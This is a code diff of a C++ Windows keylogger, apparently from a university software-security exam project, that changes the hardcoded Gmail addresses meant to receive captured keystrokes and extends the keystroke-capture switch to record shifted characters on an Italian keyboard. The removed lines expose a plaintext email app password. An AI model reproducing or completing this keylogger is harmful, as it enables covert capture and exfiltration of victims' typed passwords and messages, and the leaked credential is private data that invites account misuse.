@@ -15,9 +15,9 @@ using namespace std;
 //Variabili Globali
 //string location;
 string systemuser;
-string Email_To_Recieve_On = "sofsecexam2022@gmail.com";
-string Email_To_Send_From = "sofsecexam2022@gmail.com";
-string Password_Of_Sender_Email = "anismvlbxuszwquz";
+string Email_To_Recieve_On = "ssof.2022@gmail.com";
+string Email_To_Send_From = "ssof.2022@gmail.com";
+string Password_Of_Sender_Email = "";
 
 void getusername(void) // viene usata  Lmcons per ricavare l'username
 {
@@ -186,11 +186,47 @@ void keylog(void) //Key logger
 
                     switch (c)
                     {
+                    case 43:
+                    {
+                        if (GetAsyncKeyState(0x10))
+
+                            write << "+";
+                        else
+                            write << "*";
+                    }
+                    break;
+                    case 44:
+                    {
+                        if (GetAsyncKeyState(0x10))
+
+                            write << ",";
+                        else
+                            write << ";";
+                    }
+                    break;
+                    case 45:
+                    {
+                        if (GetAsyncKeyState(0x10))
+
+                            write << "-";
+                        else
+                            write << "_";
+                    }
+                    break;
+                    case 46:
+                    {
+                        if (GetAsyncKeyState(0x10))
+
+                            write << ".";
+                        else
+                            write << ":";
+                    }
+                    break;
                     case 48:
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << ")";
+                            write << "=";
                         else
                             write << "0";
                     }
@@ -210,7 +246,7 @@ void keylog(void) //Key logger
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << "@";
+                            write << "''";
                         else
                             write << "2";
                     }
@@ -219,7 +255,7 @@ void keylog(void) //Key logger
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << "#";
+                            write << "£";
                         else
                             write << "3";
                     }
@@ -246,7 +282,7 @@ void keylog(void) //Key logger
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << "^";
+                            write << "&";
                         else
                             write << "6";
                     }
@@ -255,7 +291,7 @@ void keylog(void) //Key logger
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << "&";
+                            write << "/";
                         else
                             write << "7";
                     }
@@ -264,7 +300,7 @@ void keylog(void) //Key logger
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << "*";
+                            write << "(";
                         else
                             write << "8";
                     }
@@ -273,7 +309,7 @@ void keylog(void) //Key logger
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << "(";
+                            write << ")";
                         else
                             write << "9";
                     }
@@ -296,7 +332,7 @@ void keylog(void) //Key logger
                         break;
 
                     //https://docs.microsoft.com/it-it/windows/win32/inputdev/virtual-key-codes
-                    //inve di usare  ASCIIS
+                    //invece di usare ASCII
                     case VK_SHIFT:
                         write << "<Shift>";
                         break;
